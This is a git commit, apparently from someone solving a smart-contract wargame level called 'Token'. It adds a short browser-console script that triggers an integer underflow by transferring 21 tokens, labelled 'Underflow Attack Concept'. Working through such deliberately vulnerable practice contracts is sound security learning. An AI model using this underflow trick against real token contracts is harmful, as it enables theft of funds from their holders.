8a0d845b946d157c5ef829811b2df2cb54eba07a
Filmptz <parichaya35@gmail.com>
2021-12-30 23:06:45 +0700

    Token-solved

---
+++ Token/token_solve.js
@@ -0,0 +1,10 @@
+/** solved on browser's console */
+
+/** 
+ * Underflow Attack Concept
+ * Send 21 Tokens to other address
+ * 
+*/
+
+const otherAdderss // Receiver address
+await contract.transfer(otherAdderss, 21)
